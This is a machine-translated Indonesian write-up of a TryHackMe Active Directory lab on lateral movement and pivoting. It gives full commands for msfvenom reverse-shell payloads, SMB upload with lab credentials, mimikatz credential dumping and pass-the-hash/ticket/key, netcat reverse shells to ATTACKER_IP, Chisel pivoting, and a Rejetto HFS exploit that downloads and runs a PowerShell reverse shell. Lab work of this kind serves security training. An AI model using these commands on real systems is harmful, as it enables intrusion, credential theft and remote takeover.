---
title: "Lateral Movement and Pivoting"
description: "Konfigurasi Lingkungan config ip DNS Menjalankan Proses Jarak Jauh Untuk menyelesaikan latihan ini, Anda perlu terhubung ke THMJMP2 menggunakan kredensial yang diberikan kepada Anda di Tugas 1 dari"
lang: "id"
translationKey: "lateral-movement-and-pivoting"
category: "lab-writeups"
tags: []
publishDate: "2024-12-13"
draft: true
featured: false
sample: false
author: "Dimas Sahid Abdullah"
translationStatus: "machine"
sourceLang: "en"
notionId: "15b5fca1-ed80-806d-9fcd-cec0c2c44ae4"
notionUrl: "https://app.notion.com/p/Lateral-Movement-and-Pivoting-15b5fca1ed80806d9fcdcec0c2c44ae4"
notionLastEdited: "2025-05-31T16:52:00.000Z"
---

# Konfigurasi Lingkungan

konfigurasi ip DNS

![](/images/lateral-movement-and-pivoting/b7aed61899fb.png)

# Proses Pembuatan Spawn dari Jarak Jauh

Untuk menyelesaikan latihan ini, Anda perlu terhubung ke THMJMP2 menggunakan kredensial yang diberikan kepada Anda di Tugas 1 dari [http://distributor.za.tryhackme.com/creds](http://distributor.za.tryhackme.com/creds). Jika Anda belum melakukannya, klik tautan dan dapatkan kredensial sekarang. Setelah Anda memiliki kredensial, hubungkan ke THMJMP2 melalui SSH:

`ssh za\\<AD Username>@thmjmp2.za.tryhackme.com`

Untuk latihan ini, kita akan berasumsi bahwa kita telah memperoleh beberapa kredensial dengan akses administratif:

**Pengguna:** ZA.TRYHACKME.COM\t1_leonard.summers

**Kata Sandi:** EZpass4ever

Kami akan menunjukkan cara menggunakan kredensial tersebut untuk berpindah secara lateral ke THMIIS menggunakan `sc.exe`. Silakan coba metode lain, karena semuanya seharusnya berfungsi terhadap THMIIS.

Meskipun kita telah menunjukkan cara menggunakan sc untuk membuat pengguna pada sistem jarak jauh (dengan menggunakan `net user`), kita juga dapat mengunggah biner apa pun yang ingin kita jalankan dan mengaitkannya dengan layanan yang dibuat. Namun, jika kita mencoba menjalankan reverse shell menggunakan metode ini, kita akan melihat bahwa reverse shell terputus segera setelah eksekusi. Alasannya adalah bahwa executable layanan berbeda dengan file .exe standar, dan oleh karena itu executable non-layanan akan langsung dihentikan oleh pengelola layanan. Untungnya bagi kita, msfvenom mendukung format `exe-service`, yang akan membungkus payload apa pun yang kita inginkan di dalam executable layanan yang berfungsi penuh, mencegahnya dihentikan.

Untuk membuat reverse shell, kita dapat menggunakan perintah berikut:

**Catatan:** Karena Anda akan berbagi lab dengan orang lain, Anda perlu menggunakan nama file yang berbeda untuk payload Anda selain "myservice.exe" untuk menghindari penimpaan payload orang lain.

```bash
msfvenom -p windows/shell_reverse_tcp -f exe-service LHOST=10.50.17.72 LPORT=4443 -o exploit.exe
```

![](/images/lateral-movement-and-pivoting/d3887c61598d.png)

Kemudian kita melakukan enumerasi folder bersama mana yang memiliki izin tulis pada target.

![](/images/lateral-movement-and-pivoting/d2b2705b9409.png)

Setelah mengetahui folder bersama yang memiliki izin tulis, selanjutnya kita menggunakan kredensial t1_leonard.summers untuk mengunggah payload kita ke share ADMIN$ THMIIS menggunakan smbclient dari AttackBox kita:

```bash
smbclient -c 'put exploit.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
```

![](/images/lateral-movement-and-pivoting/5992ad4606ab.png)

Periksa apakah file .exe kita telah berhasil diunggah.

```bash
smbclient -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
```

sebelum:

![](/images/lateral-movement-and-pivoting/08cb9b98431b.png)

Setelah:

![](/images/lateral-movement-and-pivoting/1fecbf52c2c7.png)

Setelah file executable kita diunggah, lanjutkan untuk membuat layanan baru dari jarak jauh dengan menggunakan sc, dan mengaitkannya dengan file binary yang telah kita unggah:

```bash
# create a service
sc.exe \\thmiis.za.tryhackme.com create <nama_service> binPath= "%windir%\myservice.exe" start= auto
```

![](/images/lateral-movement-and-pivoting/f0d6c22d4529.png)

Kemudian menjalankan layanan sambil mendengarkan menggunakan nc, Voila, kita mendapatkan nt/authority pada **thmiis**

![](/images/lateral-movement-and-pivoting/d9c0524ed78b.png)

![](/images/lateral-movement-and-pivoting/b7e756d80178.png)

# Bergerak Secara Lateral Menggunakan WMI

Untuk menyelesaikan latihan ini, Anda perlu terhubung ke THMJMP2 menggunakan kredensial yang diberikan kepada Anda pada Tugas 1 dari [http://distributor.za.tryhackme.com/creds](http://distributor.za.tryhackme.com/creds). Jika Anda belum melakukannya, klik tautan dan dapatkan kredensial. Setelah Anda memiliki kredensial, hubungkan ke THMJMP2 melalui SSH:

`ssh za\\<AD Username>@thmjmp2.za.tryhackme.com`

Untuk latihan ini, kita akan berasumsi bahwa kita telah memperoleh beberapa kredensial dengan akses administratif:

**Pengguna:** ZA.TRYHACKME.COM\t1_corine.waters

**Kata Sandi:** Korine.1994

Kami akan menunjukkan cara menggunakan kredensial tersebut untuk berpindah secara lateral ke THM-IIS menggunakan paket WMI dan MSI. Silakan coba metode lain yang disajikan selama tugas ini.

Kita akan mulai dengan membuat payload MSI kita menggunakan msfvenom dari mesin penyerang kita:

**Catatan:** Karena Anda akan berbagi laboratorium dengan orang lain, Anda akan
ingin menggunakan nama file yang berbeda untuk payload Anda alih-alih
Gunakan "myinstaller.msi" untuk menghindari penimpaan payload milik orang lain.

![](/images/lateral-movement-and-pivoting/8324413ccf02.png)

lalu pindahkan malware .msi kami ke folder bersama

![](/images/lateral-movement-and-pivoting/88d2fe3e4ab4.png)

Kemudian, mulailah sesi WMI terhadap THMIIS dari konsol Powershell:

![](/images/lateral-movement-and-pivoting/50769c65f33a.png)

Kemudian, kita memanggil metode Install dari kelas Win32_Product untuk memicu payload:

![](/images/lateral-movement-and-pivoting/57057ff410b9.png)

Voila, kita mendapatkan nt/otoritas di THMIIS.

![](/images/lateral-movement-and-pivoting/a941c2e548fe.png)

# Lewatkan Tanda Hash

**Mengekstraksi hash NTLM dari SAM lokal:**

Metode ini hanya memungkinkan Anda untuk mendapatkan hash dari pengguna lokal di mesin tersebut. Hash pengguna domain tidak akan tersedia.

![](/images/lateral-movement-and-pivoting/9927daa77de5.png)

**Mengekstraksi hash NTLM dari memori LSASS:**

Metode ini memungkinkan Anda mengekstrak hash NTLM untuk pengguna lokal dan pengguna domain mana pun yang baru saja masuk ke mesin tersebut.

![](/images/lateral-movement-and-pivoting/5de14696b864.png)

Kita kemudian dapat menggunakan hash yang diekstrak untuk melakukan serangan PtH dengan menggunakan mimikatz untuk menyuntikkan token akses untuk pengguna korban pada reverse shell (atau perintah lain yang Anda inginkan) sebagai berikut:

```bash
mimikatz # token::revert
mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
```

Perhatikan bahwa kami menggunakan `token::revert` untuk mengembalikan hak akses token asli kami, karena mencoba melewati hash dengan token yang ditingkatkan tidak akan berhasil.

Ini akan setara dengan menggunakan `runas /netonly` tetapi dengan hash sebagai pengganti kata sandi dan akan memunculkan reverse shell baru dari mana kita dapat menjalankan perintah apa pun sebagai pengguna korban.

**Melakukan Operasi Passing Hash Menggunakan Linux:**

Jika Anda memiliki akses ke sistem Linux (seperti AttackBox Anda), beberapa alat memiliki dukungan bawaan untuk melakukan PtH menggunakan berbagai protokol. Tergantung pada layanan mana yang tersedia untuk Anda, Anda dapat melakukan hal berikut:
mengikuti:

*Hubungkan ke RDP menggunakan PTH:*

```text
xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
```

*Hubungkan melalui psexec menggunakan PtH:*

```text
psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP
```

**Catatan:** Hanya versi Linux dari psexec yang mendukung PTH.

*Hubungkan ke WinRM menggunakan PtH:*

```text
evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
```

# Berikan Tiketnya

```bash
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
```

# **Lewati-tanda-hash / Lewati-Kunci**

Jenis serangan ini mirip dengan PtH tetapi diterapkan pada jaringan Kerberos.

Saat pengguna meminta TGT, mereka mengirimkan stempel waktu yang dienkripsi dengan kunci enkripsi yang berasal dari kata sandi mereka. Algoritma yang digunakan untuk mendapatkan kunci ini dapat berupa DES (dinonaktifkan secara default pada versi Windows saat ini), RC4, AES128, atau AES256, tergantung pada versi Windows yang terinstal dan konfigurasi Kerberos. Jika kita memiliki salah satu kunci tersebut, kita dapat meminta TGT dari KDC tanpa memerlukan kata sandi sebenarnya, oleh karena itu dinamakan **Pass-the-key (PtK)**.

Kita dapat memperoleh kunci enkripsi Kerberos dari memori dengan menggunakan mimikatz dengan perintah berikut:

```text
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```

Tergantung pada kunci yang tersedia, kita dapat menjalankan perintah berikut di mimikatz untuk mendapatkan reverse shell melalui Pass-the-Key (`nc64` sudah tersedia di THMJMP2 untuk kenyamanan Anda):

**Jika kita memiliki hash RC4:**

```text
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

**Jika kita memiliki hash AES128:**

```text
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

**Jika kita memiliki hash AES256:**

```text
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

Perhatikan bahwa saat menggunakan RC4, kuncinya akan sama dengan hash NTLM dari pengguna. Ini berarti bahwa jika kita dapat mengekstrak hash NTLM, kita dapat menggunakannya untuk meminta TGT selama RC4 adalah salah satu protokol yang diaktifkan. Varian khusus ini biasanya dikenal sebagai **Overpass-the-Hash (OPtH)**.

**Contoh pass-the-hash**

```bash
privilege::debug
token::elevate
sekurlsa::msv
```

![](/images/lateral-movement-and-pivoting/930032cfa01d.png)

```bash
impacket-wmiexec -hashes ':533f1bd576caa912bdb9da284bbc60fe' 'za.tryhackme.com/t1_toby.beck@thmiis.za.tryhackme.com'
```

![](/images/lateral-movement-and-pivoting/e71354872905.png)

cara 2 :

Sebelum melakukan ini, Anda perlu menjalankan perintah `token::revert` untuk mengembalikan token Anda. Saya sudah mencoba pth sebelum perintah ini dan gagal.

![](/images/lateral-movement-and-pivoting/9a651c7eeaab.png)

**Contoh tiket masuk dari Windows**

```bash
# first dump the tickets
privilege::debug
token::elevate
sekurlsa::tickets /export
kerberos::ptt <ticket file>
winrs.exe -r:<host target> powershell.exe
```

![](/images/lateral-movement-and-pivoting/25a39e02c8fa.png)

meneruskan tiket pengguna t1_toby.beck

![](/images/lateral-movement-and-pivoting/c5849943196e.png)

periksa apakah tiket berhasil masuk ke sesi kita

![](/images/lateral-movement-and-pivoting/91e204f97b97.png)

Voila, kita berhasil melakukan perpindahan lateral ke THMIIS sebagai pengguna t1_toby.beck

![](/images/lateral-movement-and-pivoting/e554bbf51c23.png)

**Contoh lulus tiket dari linux**

```bash
# Convert the ticket to Linux format
impacket-ticketConverter \[0\;ca99f8\]-2-0-40e10000-t1_toby.beck@krbtgt-ZA.TRYHACKME.COM.kirbi t1_toby.beck.ccache

# Set an environment variable for Impacket
export KRB5CCNAME=t1_toby.beck.ccache

# Using wmiexec here as an example
impacket-wmiexec za.tryhackme.com/t1_toby.beck@thmiis.za.tryhackme.com -k -no-pass
```

![](/images/lateral-movement-and-pivoting/d5228f2d0405.png)

**Contoh pass-the-key dari windows**

Buang kuncinya:

```bash
# first dump the keys
privilege::debug
token::elevate
sekurlsa::ekeys
winrs.exe -r:<nama host> powershell.exe
```

![](/images/lateral-movement-and-pivoting/ba69f3a134bf.png)

teruskan kunci pengguna t1_toby.beck :

![](/images/lateral-movement-and-pivoting/19f8a7562cb3.png)

Referensi: [https://strontic.github.io/xcyclopedia/library/winrs.exe-FF0007592245B0EF82886AB224CC8302.html](https://strontic.github.io/xcyclopedia/library/winrs.exe-FF0007592245B0EF82886AB224CC8302.html)

**Contoh berikan kunci dari linux**

```bash
# Request a TGT using the AES-256 hash
impacket-getTGT 'za.tryhackme.com/t1_toby.beck' -aesKey 6a0d48f79acaec013d928d84a102b72028d574340b6139e876e179db48fbde4e

# Create an environment variable for Impacket
export KRB5CCNAME=t1_toby.beck.ccache

# Get a shell
impacket-wmiexec 'za.tryhackme.com/t1_toby.beck@thmiis.za.tryhackme.com' -k -no-pass
```

![](/images/lateral-movement-and-pivoting/4f93673d2e26.png)

# Penyalahgunaan Perilaku Pengguna

## Pembajakan RDP

Saat administrator menggunakan Remote Desktop untuk terhubung ke mesin dan menutup klien RDP alih-alih keluar, sesi administrator akan tetap terbuka di server tanpa batas waktu. Jika Anda memiliki hak akses SYSTEM pada Windows Server 2016 dan versi sebelumnya, Anda dapat mengambil alih sesi RDP yang ada tanpa memerlukan kata sandi.

Jika kita memiliki akses tingkat administrator, kita dapat memperoleh SYSTEM dengan metode apa pun yang kita sukai. Untuk saat ini, kita akan menggunakan psexec untuk melakukannya. Pertama, mari kita jalankan cmd.exe sebagai administrator:

![](/images/lateral-movement-and-pivoting/dff05c6ea5eb.png)

Dari situ, jalankan `PsExec64.exe`(tersedia di `C:\tools\`):

```bash
PsExec64.exe -s cmd.exe
```

![](/images/lateral-movement-and-pivoting/6af03391f8fc.png)

Untuk melihat daftar sesi yang ada di server, Anda dapat menggunakan perintah berikut:

```bash
query user
```

![](/images/lateral-movement-and-pivoting/79d6e5da5992.png)

Berdasarkan output perintah di atas, jika kita saat ini terhubung melalui RDP menggunakan pengguna administrator, SESSIONNAME kita adalah `rdp-tcp#14`. Kita juga dapat melihat bahwa pengguna bernama t1_toby.beck telah membiarkan sesi terbuka dengan id `8`. Setiap sesi dengan status **Disc** telah dibiarkan terbuka oleh pengguna dan tidak sedang digunakan saat ini. Meskipun Anda juga dapat mengambil alih sesi aktif, pengguna yang sah akan dipaksa keluar dari sesinya ketika Anda melakukannya, yang dapat diketahui oleh mereka.

Untuk terhubung ke sebuah sesi, kita akan menggunakan tscon.exe dan menentukan ID sesi yang akan kita ambil alih, serta SESSIONNAME kita saat ini. Mengikuti contoh sebelumnya, untuk mengambil alih sesi t1_toby.beck jika kita terhubung sebagai pengguna administrator, kita akan menggunakan perintah berikut:

```bash
tscon 8 /dest:rdp-tcp#14
```

![](/images/lateral-movement-and-pivoting/01ea1a36c34c.png)

# Penerusan Port

Masalah kami adalah kami tidak dapat mengakses THMIIS melalui RDP, tetapi ketika kami melakukan enumerasi pada target, kami menemukan bahwa port 3389 hanya dapat diakses melalui jaringan internal yaitu THMJMP2.

![](/images/lateral-movement-and-pivoting/5e617d7ffca7.png)

dari thmjmp2

![](/images/lateral-movement-and-pivoting/1e9ad61f7ede.png)

## Port Forward Menggunakan Chisel

Pertama, masuk ke jumphost melalui SSH, yaitu JMP2.

```bash
# Use the credentials obtained from the distributor
ssh username@za.tryhackme.com@thmjmp2.za.tryhackme.com
```

Transfer file `chisel.exe` ke sesi SSH Anda. Mulai server web di Kali.

```bash
sudo python3 -m http.server 80
```

Unduh file ke `thmjmp2` . Mulai terminal PowerShell.

```bash
powershell.exe
Invoke-WebRequest 'http://kali-vpn-ip/chisel.exe' -OutFile .\chisel.exe
```

**File Konfigurasi ProxyChains untuk menggunakan Chisel**

```bash
subl /etc/proxychains4.conf and /etc/proxychains.conf
```

![](/images/lateral-movement-and-pivoting/4364d8cf720d.png)

Kondisi kami adalah kami ingin terhubung ke THMIIS melalui RDP tetapi kami diblokir dan tidak dapat terhubung ke port 3389 seperti berikut.

![](/images/lateral-movement-and-pivoting/b914c249fb16.png)

Namun dari dalam THMJMP2 kita mendapatkan bahwa port 3389 terbuka, yang berarti koneksi keluar ke port 3389 dinonaktifkan, jadi mari kita gunakan Chisel untuk melakukan pivoting.

![](/images/lateral-movement-and-pivoting/c38c17a6c863.png)

Kita telah berhasil melakukan pivoting menggunakan Chisel dan kita dapat melihat bahwa port 3389 (RDP) terbuka, sekarang mari kita login menggunakan pengguna `t1_thomas.moore : MyPazzw3rd2`

![](/images/lateral-movement-and-pivoting/2467f29edaf0.png)

## **Eksploitasi Rejetto HFS pada Pengontrol Domain**

edit konfigurasi proxychains

```bash
sudo nano /etc/proxychains4.conf
```

Gulir ke bawah ke bagian `[ProxyList]` dan tambahkan koneksi proxy Anda.

![](/images/lateral-movement-and-pivoting/fdfb0fcf0ffd.png)

**Lakukan pemindaian port pada Pengontrol Domain**

Menurut pelajaran tersebut, Rejetto HFS berjalan di `TCP/80` . Selain itu, karena kita menggunakan proxy SOCKS untuk mencapai server, Anda harus menentukan pemindaian TCP SYN penuh dengan `-sT` .

```bash
sudo proxychains -q nmap -Pn -sT -sV -p80 -T4 thmdc.za.tryhackme.com
```

![](/images/lateral-movement-and-pivoting/7440eff77d18.png)

**Siapkan Port Forwarding dan Reverse Dynamic Socks Proxy**

Pertama, pada THMJMP2 kami menjalankan klien Chisel.

```bash
.\chisel client 10.50.17.
72:8080 R:socks 0.0.0.0:50080:10.50.17.72:80 0.0.0.0:50081:10.50.17.72:81
```

> Catatan: semua lalu lintas THMJMP2 pada port 50080 akan diteruskan ke port 80 Kali Linux, dan port 50081 juga akan diteruskan ke port 81.

yang kedua di Kali Linux kami yang menjalankan server Chisel.

```bash
./chisel server -p 8080 --reverse --socks5
```

![](/images/lateral-movement-and-pivoting/2cb61c393cad.png)

**Unduh Payload Reverse Shell**

Saya akan menggunakan reverse shell PowerShell ini [**payload di sini**](https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1?ref=benheater.com).

```bash
wget https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1
```

Ubah muatannya. Kita memberi tahu ***pengontrol domain*** untuk terhubung ke `thmjmp2` pada `TCP/50081` , yang kemudian diteruskan secara **terbalik** ke Kali pada `TCP/81` .

```bash
$socket = new-object System.Net.Sockets.TcpClient('thmjmp2.za.tryhackme.com', 50081);
```

![](/images/lateral-movement-and-pivoting/671ad4c2d847.png)

**Salin dan Tinjau Muatan Python**

```bash
searchsploit Rejetto

Rejetto HttpFileServer 2.3.x - Remote Command Execution (3) | windows/webapps/49125.py
```

Salin muatan (payload) ke direktori kerja Anda.

```bash
searchsploit -m 49125
```

Tinjau kembali eksploitasi tersebut. Dengan cara saya menyiapkan lingkungan saya, sepertinya saya seharusnya bisa mendapatkan reverse shell dengan perintah ini:

```bash
proxychains -q python3 49125.py thmdc.za.tryhackme.com 80 "C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://thmjmp2.za.tryhackme.com:50080/mini-reverse.ps1')"
```

Sekarang, mari kita lakukan langkah-langkah berikut di Kali Linux kita:

- Mulai server web Python untuk menampung payload `mini-reverse.ps1`
```bash
sudo python3 -m http.server 80
```

- Mulai pendengar `netcat` tangkap shell
```bash
sudo rlwrap nc -lnvp 81
```

lalu menjalankan exploit tersebut:

```bash
sudo proxychains -q python3 49125.py thmdc.za.tryhackme.com 80 "C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://thmjmp2.za.tryhackme.com:50080/mini-reverse.ps1')"
```

![](/images/lateral-movement-and-pivoting/273b22937bea.png)

Lalu, voilà, kita berhasil mendapatkan revshell di Kali Linux kita.

![](/images/lateral-movement-and-pivoting/9e8c4f8e9e5f.png)
